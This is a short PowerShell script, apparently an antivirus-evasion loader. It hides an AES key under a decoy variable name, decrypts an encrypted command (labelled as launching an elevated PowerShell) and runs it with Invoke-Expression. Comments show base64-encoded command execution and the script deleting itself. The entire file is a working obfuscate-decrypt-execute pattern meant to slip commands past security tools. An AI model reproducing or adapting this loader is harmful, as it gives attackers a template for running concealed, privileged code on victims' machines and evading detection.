function Decrypt-String($key, $encryptedStringWithIV)
{
    $bytes = [System.Convert]::FromBase64String($encryptedStringWithIV)
    $IV = $bytes[0..15]
    $aesManaged = Create-AesManagedObject $key $IV
    $decryptor = $aesManaged.CreateDecryptor();
    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16);
    $aesManaged.Dispose()
    [System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
}

function Create-AesManagedObject($key, $IV)
{
    $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
    $aesManaged.BlockSize = 128
    $aesManaged.KeySize = 256
    if ($IV) {
        if ($IV.getType().Name -eq "String") {
            $aesManaged.IV = [System.Convert]::FromBase64String($IV)
        }
        else {
            $aesManaged.IV = $IV
        }
    }
    if ($key) {
        if ($key.getType().Name -eq "String") {
            $aesManaged.Key = [System.Convert]::FromBase64String($key)
        }
        else {
            $aesManaged.Key = $key
        }
    }
    $aesManaged
}

# $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
# $encodedCommand = [Convert]::ToBase64String($bytes)
# powershell.exe -encodedCommand $encodedCommand

# Encryption key: QpNH1hF/Bw9iWtfb9c1/eNvN6KSkztayiydINfful4s=
$mitigation_eigar_av_gets_code="UQBwAE4ASAAxAGgARgAvAEIAdwA5AGkAVwB0AGYAYgA5AGMAMQAvAGUATgB2AE4ANgBLAFMAawB6AHQAYQB5AGkAeQBkAEkATgBmAGYAdQBsADQAcwA9AA=="
$payload_mitigation = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($mitigation_eigar_av_gets_code))

# Decrypted Code: Start-Process powershell -Verb runas 
$encrypted_code = 'OQOVMDApUj2QklpdygNyLHZ5eB7B48NDs3RL+8XhuomLpgOUUJJOlBK223F/YMQvwkNy0T5+pbCcM4y6yknbsQ=='

$ready2go = Decrypt-String $payload_mitigation $encrypted_code
Invoke-Expression $ready2go

# Script Deletes itself immediately
# Remove-Item $MyInvocation.MyCommand.Definition -Force -WhatIf